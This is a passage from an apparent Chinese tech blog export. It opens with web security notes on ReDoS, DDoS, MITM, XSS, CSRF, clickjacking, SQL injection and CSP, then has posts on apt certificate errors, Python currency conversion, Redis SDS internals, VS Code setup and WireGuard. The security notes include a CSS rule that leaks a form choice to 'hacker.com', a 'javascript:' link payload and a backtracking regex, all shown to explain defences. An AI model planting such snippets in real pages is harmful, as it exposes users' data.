<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> greedyRegExp = <span class="regexp">/a+/</span>  <span class="comment">// 有多少匹配多少</span></span><br><span class="line"><span class="keyword">const</span> nonGreedyRegExp = <span class="regexp">/a+?/</span>  <span class="comment">// 有一个就行</span></span><br><span class="line"><span class="keyword">const</span> str = <span class="string">&quot;aaaaaaaaaaaa&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(greedyRegExp)[<span class="number">0</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(nonGreedyRegExp)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p>有以下正则表达式<br><code>^((ab)*)+$</code></p>
<p>执行过程中存在的问题</p>


<p>大量的回溯会造成响应时间大大加长，接口吞吐量也会随之下降</p>
<p>需要注意的地方</p>
<ul>
<li>耗时的同步操作</li>
<li>数据库写入</li>
<li>SQL join</li>
<li>文件备份</li>
<li>循环执行逻辑</li>
</ul>
<h3 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>短时间内发送大量重复请求，造成服务器处理堵塞请求堆积，导致服务器雪崩从而无法响应新请求</p>
<p>特点：量大、攻击手段简单、破坏性严重</p>
<h4 id="案例-2"><a href="#案例-2" class="headerlink" title="案例"></a>案例</h4><p>攻击者修改TCP发送大量SYN包，但不响应服务器ACK + SYN包，导致服务器无法释放连接从而堵塞</p>


<h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>环境</p>
<ul>
<li>明文传输</li>
<li>信息纂改不可知</li>
<li>对方身份未验证</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">A[客户端]</span><br><span class="line">B[中间人]</span><br><span class="line">C[服务器]</span><br><span class="line">A--&gt;B;</span><br><span class="line">B--&gt;C;</span><br><span class="line">C--&gt;B;</span><br><span class="line">B--&gt;A;</span><br></pre></td></tr></table></figure>

<p>在这个图里，中间人窃取或纂改客户端与服务端交互的信息，从而导致信息泄露</p>
<h2 id="防御篇"><a href="#防御篇" class="headerlink" title="防御篇"></a>防御篇</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>守则</p>
<ul>
<li>永不信任外部传入数据</li>
<li>不要将用户提交内容直接转换为DOM</li>
</ul>
<p>工具</p>
<ul>
<li>主流框架默认防御XSS</li>
<li>Google-closure-library</li>
<li>DOMPurify</li>
</ul>
<h4 id="无法避免动态生成DOM"><a href="#无法避免动态生成DOM" class="headerlink" title="无法避免动态生成DOM"></a>无法避免动态生成DOM</h4><p>当存在需求无法避免动态生成DOM时，注意以下几点</p>
<h5 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h5><p>对字符进行转义</p>
<h5 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h5><p>允许上传图片时也要注意对SVG进行扫描</p>
<h5 id="自定义跳转连接"><a href="#自定义跳转连接" class="headerlink" title="自定义跳转连接"></a>自定义跳转连接</h5><p>当允许用户自定义跳转连接时，需要对跳转连接进行过滤防范，例如<code>&lt;a herf=&quot;javascript:alert(0)&quot;&gt;</code> 存在危险</p>
<h5 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h5><p>当有表单radio被点击时触发get请求, 暴露收入情况</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=radio]</span><span class="selector-class">.income-ge10k</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;http://hacker.com/?income=gt10k&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><p>当满足以下条件时，浏览器认为同源，否则跨域</p>
<ul>
<li>协议相同</li>
<li>域名相同</li>
<li>端口相同</li>
</ul>
<p>如果发生跨域，看服务器是否支持CORS</p>
<h4 id="Content-Security-Policy-CSP"><a href="#Content-Security-Policy-CSP" class="headerlink" title="Content Security Policy(CSP)"></a>Content Security Policy(CSP)</h4><p>内容安全策略定义哪些源或域名是安全的，来自安全源的脚本可以执行，否则报错</p>
<p>对eval + inline scipt 说不</p>
<h5 id="服务器端设置"><a href="#服务器端设置" class="headerlink" title="服务器端设置"></a>服务器端设置</h5><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;self&#x27; 同源允许</span><br><span class="line">Content-Security-Policy: script-src &#x27;self&#x27; https://domain.com 在同源之外允许该域脚本执行</span><br></pre></td></tr></table></figure>

<h5 id="前端设置"><a href="#前端设置" class="headerlink" title="前端设置"></a>前端设置</h5><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#x27;self&#x27;&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#x27;self&#x27; https://domain.com&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><h5 id="检查请求头部"><a href="#检查请求头部" class="headerlink" title="检查请求头部"></a>检查请求头部</h5><p>当伪造请求为异常来源时，就限制请求</p>
<p>在同源请求中，GET和HEAD不发送Origin头部，POST发送Origin头部</p>
<p>不论什么请求都带有Referer头部</p>
<h5 id="token"><a href="#token" class="headerlink" title="token"></a>token</h5><p>思路：先有页面，后有请求</p>
<ul>
<li>在页面中生成一个token，每次请求都带上这个token</li>
<li>在请求中检查token，如果不一致，则拒绝请求</li>
</ul>
<h5 id="iframe攻击"><a href="#iframe攻击" class="headerlink" title="iframe攻击"></a>iframe攻击</h5><p>通过iframe构造页面，在其放欲攻击的页面，然后放一个按钮，当点击按钮时会穿透到攻击页面</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">onContentClick</span> = (<span class="params"></span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;content click&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">onButtonClick</span> = (<span class="params"></span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;button click&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;onButtonClick&#125;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;oncontent&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;onContentClick&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                content</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当点击时日志会出现 <code>button click</code></p>
<p>防御手段:</p>
<p>通过设置X-Frame-Options: DENY&#x2F;SAMEORIGIN，阻止iframe构造页面</p>
<p>DENY为禁止 SAMEORIGIN为同源才可构造</p>
<h5 id="职责分开"><a href="#职责分开" class="headerlink" title="职责分开"></a>职责分开</h5><p>GET !&#x3D;&#x3D; GET + POST</p>
<p>不应当即响应GET，又响应POST，很容易造成用户信息泄露甚至纂改，应当分为两个处理</p>
<p>错误示范</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">async</span> <span class="title function_">getAndUpdate</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; update, id &#125; = ctx.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (update)&#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(update);</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">get</span>(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Samesite-Cookie"><a href="#Samesite-Cookie" class="headerlink" title="Samesite Cookie"></a>Samesite Cookie</h5><p>限制cookie</p>
<p>我的页面cookie只能在我的页面中使用</p>
<p>其它页面cookie都不能带上我的cookie</p>
<p>从根源上解决CSRF</p>
<p>限制的是</p>
<ol>
<li>Cookie domain</li>
<li>页面域名</li>
</ol>
<p>服务器端设置<br><code>Set-Cookie: SameSite=None; Secure;</code></p>
<h5 id="防御CSRF的正确姿势"><a href="#防御CSRF的正确姿势" class="headerlink" title="防御CSRF的正确姿势"></a>防御CSRF的正确姿势</h5><p>通过中间件来过滤</p>
<h3 id="注入-1"><a href="#注入-1" class="headerlink" title="注入"></a>注入</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>使用prepared statement</p>
<p>预编译语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> q <span class="keyword">FROM</span> <span class="string">&#x27;SELECT * FROM users WHERE id = ?&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@gender</span> <span class="operator">=</span> <span class="string">&#x27;female&#x27;</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> q <span class="keyword">USING</span> <span class="variable">@gender</span></span><br><span class="line"><span class="keyword">DEALLOCATE</span> <span class="keyword">PREPARE</span> q;</span><br></pre></td></tr></table></figure>

<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>最小原则<br>不要给sudo或者root</p>
<p>建立允许名单 + 过滤<br>例如禁止rm</p>
<p>对URL类型参数进行协议、域名、ip等限制<br>例如禁止访问内网</p>
<h3 id="DoS-1"><a href="#DoS-1" class="headerlink" title="DoS"></a>DoS</h3><h4 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h4><p>完善代码review工作，避免使用贪婪匹配，特别是在接口处理上</p>
<p>代码扫描 + 正则性能测试</p>
<p>不要使用用户提供的正则</p>
<h4 id="DDoS-1"><a href="#DDoS-1" class="headerlink" title="DDoS"></a>DDoS</h4><ol>
<li>流量治理</li>
</ol>
<ul>
<li>负载均衡</li>
<li>API 网关</li>
<li>CDN</li>
</ul>
<ol>
<li>快速自动扩容</li>
<li>非核心业务降级</li>
</ol>
<p>在负载均衡及 API 网关处可以进行流量识别过滤掉异常请求</p>
<p>通过CDN、快速自动扩容、非核心业务降级进行抗量，提高服务器承载能力</p>
<h4 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h4><p>使用HTTPS加密传输内容</p>
<p>HTTPS特性：</p>
<ul>
<li>可靠性：加密</li>
<li>完整性：MAC验证</li>
<li>不可抵赖性：数字签名 确保双方身份</li>
</ul>
<p>HTTPS握手过程略</p>
<p><strong>完整性</strong><br>服务器在内容中加入hash信息，客户端收到后重新计算并校验hash</p>
<p><strong>数字签名</strong><br>私钥签名，公钥验证</p>
<p><strong>不可抵赖性</strong><br>存在一个CA(证书机构), 服务方会将一些元信息以及公钥合并成一个信息，使用CA提供的私钥对证书进行签名，形成服务器端保存的证书，这个证书传递给浏览器，浏览器利用CA公钥进行校验，如果校验成功，则证书有效</p>
<p>浏览器会大量内置各个CA公约</p>
<p>也要注意防止证书签名算法不够健壮时仍有证书风险</p>
<h4 id="SRI"><a href="#SRI" class="headerlink" title="SRI"></a>SRI</h4><p>可以防范CDN被hack</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://demo.com/script.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-&#123;some-hash-value&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 伪代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scipt</span> <span class="attr">lang</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span></span><br><span class="line">    const remoteHash = hash(content);</span><br><span class="line">    if (tagHash !== remoteHash) &#123;</span><br><span class="line">        throw new Error(&#x27;Hash mismatch&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h4><p>浏览器：</p>
<p>Feature-Policy&#x2F;Permission-Policy</p>
<p>一个源(页面)，可以使用哪些功能，例如麦克风、摄像头等</p>
<ul>
<li>camera</li>
<li>microphone</li>
<li>geolocation</li>
<li>autoplay<br>…</li>
</ul>
<p>当使用iframe时，可以使用<code>&lt;iframe allow=&quot;...&quot;&gt;</code> 来设置</p>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>安全无小事</li>
<li>使用的依赖也可能成为被攻破的一环</li>
<li>保持学习的心态</li>
</ul>
<h3 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h3><p><a href="https://www.amazon.com/Web-Application-Security-Exploitation-Countermeasures/dp/1492053112/ref=sr_1_3?crid=3KZBER4W7Z6JF&dchild=1&keywords=web+security&qid=1627822659&sprefix=web+secu,aps,360&sr=8-3">Web Application Security: Exploitation and Countermeasures for Modern Web Applications</a></p>
<p><a href="https://imnerd.org/samesite.html">SameSite 那些事</a></p>
<p><a href="https://github.com/AngusFu/diary/issues/32">关于 Web 安全突然想到的 #32</a></p>
<p><a href="https://aws.amazon.com/cn/shield/ddos-attack-protection/">什么是 DDoS 攻击？</a></p>
]]></content>
      <tags>
        <tag>web, security</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 报错Certificate verification failed: The certificate is NOT trusted.</title>
    <url>//Linux-Error-Certificate-verification-failed-The-certificate-is-NOT-trusted/</url>
    <content><![CDATA[<p>在 Linux 系统中使用 apt-get 更新软件时，出现错误 <code>Certificate verification failed: The certificate is NOT trusted.</code> 的解决方法</p>
<span id="more"></span>

<p>原因为未安装ca-certificates</p>
<p>可以先编辑 <code>/etc/apt/sources.list</code> 文件临时使用http源</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nano /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>粘贴或者更改源（<code>https://</code> 到 <code>http://</code>)</p>
<blockquote>
<p>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/debian/">http://mirrors.tuna.tsinghua.edu.cn/debian/</a> buster main contrib non-free<br>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/debian/">http://mirrors.tuna.tsinghua.edu.cn/debian/</a> buster-updates main contrib non-free<br>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/debian/">http://mirrors.tuna.tsinghua.edu.cn/debian/</a> buster-backports main contrib non-free<br>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/debian-security">http://mirrors.tuna.tsinghua.edu.cn/debian-security</a> buster&#x2F;updates main contrib non-free</p>
</blockquote>
<p>然后安装ca-certificates包（**<code>注意：看到有的文章将源改为http便无下文，建议继续执行以下步骤改回https，使用http将大幅度提高网络风险</code>**）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install ca-certificates</span><br></pre></td></tr></table></figure>

<p>安装完成后编辑源 <code>/etc/apt/sources.list</code></p>
<blockquote>
<p>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/debian/">https://mirrors.tuna.tsinghua.edu.cn/debian/</a> buster main contrib non-free<br>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/debian/">https://mirrors.tuna.tsinghua.edu.cn/debian/</a> buster-updates main contrib non-free<br>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/debian/">https://mirrors.tuna.tsinghua.edu.cn/debian/</a> buster-backports main contrib non-free<br>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/debian-security">https://mirrors.tuna.tsinghua.edu.cn/debian-security</a> buster&#x2F;updates main contrib non-free</p>
</blockquote>
<p>执行<code>apt update</code>更新，完成</p>
]]></content>
  </entry>
  <entry>
    <title>Python 转换金额数字大写为数字小写</title>
    <url>//Python-Code-to-Convert-Chinese-Uppercase-Amounts-to-Lowercase-Numbers/</url>
    <content><![CDATA[<p>通过编写Python代码将中文大写金额转换为小写数字</p>
<span id="more"></span>

<p>py浮点型运算有一个魔法，例如1.01*3.0&#x3D;3.0300000000000002<br>所以全部转为整数运算，最后除100返回</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">toInt</span>(<span class="params">value</span>):</span><br><span class="line">    isum = <span class="number">0</span></span><br><span class="line">    nums = &#123;<span class="string">&#x27;零&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;壹&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;贰&#x27;</span>:<span class="number">2</span>, <span class="string">&#x27;叁&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;肆&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;伍&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;陆&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;柒&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;捌&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;玖&#x27;</span>:<span class="number">9</span>&#125;</span><br><span class="line">    dw = &#123;<span class="string">&#x27;拾&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;元&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;佰&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;仟&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;万&#x27;</span> : <span class="number">6</span>, <span class="string">&#x27;角&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;分&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index &lt; <span class="built_in">len</span>(value):</span><br><span class="line">        <span class="keyword">if</span> value[index] != <span class="string">&#x27;零&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> (value[index] == <span class="string">&#x27;拾&#x27;</span>):</span><br><span class="line">                isum += <span class="number">1000</span>;</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> value[index] <span class="keyword">in</span> nums :</span><br><span class="line">                isum += nums[value[index]] * <span class="built_in">pow</span>(<span class="number">10</span>, dw[value[index + <span class="number">1</span>]])</span><br><span class="line">                index += <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                index +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(isum, <span class="number">2</span>) / <span class="number">100</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Redis Reading Notes</title>
    <url>//Redis-Reading-Notes/</url>
    <content><![CDATA[<p>Redis 是一个开源的内存数据库，它支持多种数据结构，如字符串、列表、集合、有序集合、哈希表等，同时支持持久化，主从复制，集群等功能。在这篇文章中记录了阅读 Redis 源码的一些笔记。</p>
<span id="more"></span>

<p>本文源码版本截至commit：</p>
<blockquote>
<p>14f802b: Initialize cluster owner_not_claiming_slot to avoid warning (#12391)</p>
</blockquote>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="SDS-动态字符串实现"><a href="#SDS-动态字符串实现" class="headerlink" title="SDS 动态字符串实现"></a>SDS 动态字符串实现</h3><p>redis通过sds来存储字符串，相较于c语言的字符串，sds有以下优点：</p>
<ul>
<li>常数复杂度获取字符串长度（对于c语言字符串，需要遍历整个字符串才能获取长度）</li>
<li>减少修改字符串时所需的内存重分配次数</li>
<li>二进制安全（可以存储任意数据，包括空字符，如 <code>\0</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* Note: sdshdr5 is never used, we just access the flags byte directly.</span></span><br><span class="line"><span class="comment"> * However is here to document the layout of type 5 SDS strings. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">hisdshdr5</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flags; <span class="comment">/* 3 lsb of type, and 5 msb of string length */</span></span><br><span class="line">    <span class="type">char</span> buf[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">hisdshdr8</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> len; <span class="comment">/* used */</span></span><br><span class="line">    <span class="type">uint8_t</span> alloc; <span class="comment">/* excluding the header and null terminator */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flags; <span class="comment">/* 3 lsb of type, 5 unused bits */</span></span><br><span class="line">    <span class="type">char</span> buf[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>sds有两种，一种是类型长度以高低位存储在一个变量中如 <code>hisdshdr5</code>，另一种是分别存储在不同变量中，如 <code>hisdshdr8</code>，<code>hisdshdr16</code>，<code>hisdshdr32</code>，<code>hisdshdr64</code></p>
<p>在<code>hisdshdr5</code>中，<code>flags</code>的低三位存储类型，高五位存储长度，所以长度最大为32位，即2^5-1，即31字节</p>
<p>在代码注释中有以下说明</p>
<blockquote>
<p>Note: sdshdr5 is never used, we just access the flags byte directly.<br>However is here to document the layout of type 5 SDS strings.</p>
</blockquote>
<p>意思是说，<code>hisdshdr5</code>并没有被使用，我们直接访问<code>flags</code>字节，但是这里是为了记录类型5的sds字符串的布局。</p>
<p>在<code>hisdshdr8</code>中，<code>len</code>存储长度，<code>alloc</code>存储分配长度，<code>flags</code>存储类型，所以长度最大为8位，即2^8-1，即255字节</p>
<p>结构体中使用了<code>__attribute__ ((__packed__))</code>，这是gcc的扩展，用于告诉编译器不要对结构体进行字节对齐，这样可以节省内存，但是会降低访问效率，同时使用了柔性数组成员（C99标准引入），柔性数组成员是一种特殊的数组类型，它可以在结构体中定义一个没有指定大小的数组，这样就可以根据需要动态地分配内存，而不用使用指针。柔性数组成员必须是结构体的最后一个成员，并且结构体中至少要有一个其他的命名成员。柔性数组成员是C99标准引入的，但是一些编译器也支持C89和C++中使用它，只是语法有些不同。柔性数组成员的优点是可以提高内存分配的效率，提高数据的局部性，以及生成更好的代码。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><table>
<thead>
<tr>
<th>说明</th>
<th>链接</th>
</tr>
</thead>
<tbody><tr>
<td>Redis 官网</td>
<td><a href="https://redis.io/">https://redis.io/</a></td>
</tr>
<tr>
<td>如何阅读 Redis 源码？</td>
<td><a href="https://blog.huangz.me/diary/2014/how-to-read-redis-source-code.html">https://blog.huangz.me/diary/2014/how-to-read-redis-source-code.html</a></td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>VS Code C/C++ 环境配置</title>
    <url>//Setting-Up-the-VS-Code-C-C-Environment/</url>
    <content><![CDATA[<p>VS Code C&#x2F;C++ 环境配置教程</p>
<span id="more"></span>

<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="预备文件"><a href="#预备文件" class="headerlink" title="预备文件"></a>预备文件</h3><h4 id="MinGW-W64"><a href="#MinGW-W64" class="headerlink" title="MinGW-W64"></a>MinGW-W64</h4><p><a href="https://wwa.lanzoui.com/ioHt0suhtva">国内下载</a><br><a href="https://sourceforge.net/projects/mingw-w64/files/">国外下载</a></p>
<h4 id="Visual-Studio-Code"><a href="#Visual-Studio-Code" class="headerlink" title="Visual Studio Code"></a>Visual Studio Code</h4><p><a href="https://code.visualstudio.com/">官网下载</a></p>
<h4 id="推荐插件"><a href="#推荐插件" class="headerlink" title="推荐插件"></a>推荐插件</h4><p><a href="https://wwa.lanzoui.com/ilVjssuj56d">Code Runner &amp; C&#x2F;C++</a></p>
<h3 id="配置编译器"><a href="#配置编译器" class="headerlink" title="配置编译器"></a>配置编译器</h3><p>将MinGW-W64解压后，复制其路径，例如解压到了C盘，路径为<code>C:\mingw64\</code></p>
<p>按下 <code>Win+R</code> 输入 <code>sysdm.cpl</code> 打开系统属性窗口，切换到高级选项，点击右下方环境变量</p>
<img src="/Setting-Up-the-VS-Code-C-C-Environment/system%20properties.png" class="" title="system properties" alt="system properties">

<p>双击系统变量中的Path项目</p>
<img src="/Setting-Up-the-VS-Code-C-C-Environment/system%20env.png" class="" title="edit env" alt="edit env">

<p>在弹出的窗口中点击右边的新建按钮，粘贴之前复制的目录，后面加上bin，例如C:\mingw64\bin，最终如图</p>
<img src="/Setting-Up-the-VS-Code-C-C-Environment/edit%20env%20ok.png" class="" title="edit env ok" alt="edit env ok">

<p>按下 <code>Win+R</code> 输入 <code>cmd</code>，在 <code>cmd</code> 窗口中输入 <code>gcc -v</code> 出现关于编译器相关信息即可，如果提示找不到可以尝试重启电脑后再运行命令</p>
<img src="/Setting-Up-the-VS-Code-C-C-Environment/mingw%20print.png" class="" title="mingw print" alt="mingw print">

<h3 id="安装VS-Code"><a href="#安装VS-Code" class="headerlink" title="安装VS Code"></a>安装VS Code</h3><p>下载 <code>VSCodeUserSetup-x64.exe</code> 文件后，双击打开，选择 <code>我同意此协议</code></p>
<img src="/Setting-Up-the-VS-Code-C-C-Environment/start%20install%20vscode.png" class="" title="start install vscode" alt="start install vscode">

<p>根据自己需要勾选，也可以按照图中所示的勾选</p>
<img src="/Setting-Up-the-VS-Code-C-C-Environment/vscode%20install%20config.png" class="" title="vscode install config" alt="vscode install config">

<p>将之前下载的 <code>插件.zip</code> 文件解压到桌面，然后启动VS Code，切到图中所指标签</p>
<img src="/Setting-Up-the-VS-Code-C-C-Environment/vscode%20start%20window.png" class="" title="vscode start window" alt="vscode start window">

<p>然后将之前解压的三个文件选中，拖放到图中画框区域进行安装</p>
<img src="/Setting-Up-the-VS-Code-C-C-Environment/vscode%20plugs%20window.png" class="" title="vscode plugs window" alt="vscode plugs window">

<p>然后点击 <code>文件</code> → <code>首选项</code> → <code>设置</code> 找到列表中的 <code>扩展</code> 点开，寻找 <code>Run Code config</code></p>
<p>寻找 Run In Terminal 勾选</p>
<p>最后选择一个Hello World源码文件右键选择VS Code打开，点击右上角三角图标运行，运行如图所示就说明环境ok可以使用了</p>
<img src="/Setting-Up-the-VS-Code-C-C-Environment/run%20cpp%20code.png" class="" title="run cpp code" alt="run cpp code">
]]></content>
      <tags>
        <tag>VS Code, C/C++, MinGW</tag>
      </tags>
  </entry>
  <entry>
    <title>WireGuard Use Notes</title>
    <url>//WireGuard%20Use%20Notes/</url>
    <content><![CDATA[<p>由于家庭和公司各存在一套开发环境，同时外出时需要能够连接至某台服务器上进行工作，所以需要一个组网的方案，考虑到安全性及性能选择了 WireGuard。</p>
<span id="more"></span>

<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><h3 id="家庭网络"><a href="#家庭网络" class="headerlink" title="家庭网络"></a>家庭网络</h3><p>家庭网络中有一个 PVE 服务器，开启了两个虚拟机分别是 windows 10 和 Ubuntu 22.04；Widows 10 通过将显卡直通进去，用于游戏娱乐；Ubuntu 22.04 作为开发机。由于手头的 mac 设备内存不够，所以所有环境都是通过 VS Code Remote SSH 到 开发机上进行工作。</p>
<h3 id="公司网络"><a href="#公司网络" class="headerlink" title="公司网络"></a>公司网络</h3><p>公司网络通过一个独立路由器创建出来一个子网，实体机安装了 Ubuntu 22.04 作为开发机，同样通过 VS Code Remote SSH 到开发机上进行工作。</p>
<h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><p><img src="/./WireGuard%20Use%20Notes/network%20topology%20diagram.png" alt="network topology diagram" loading="lazy"></p>
<h2 id="搭建-WireGuard"><a href="#搭建-WireGuard" class="headerlink" title="搭建 WireGuard"></a>搭建 WireGuard</h2><p>为了方便管理，使用了 <code>wg-easy</code> 这个工具，具体的安装和使用可以参考 <a href="https://github.com/wg-easy/wg-easy">wg-easy</a></p>
<p>CIDR 选择了 <code>192.168.3.0/24</code></p>
<p>compose.yaml</p>
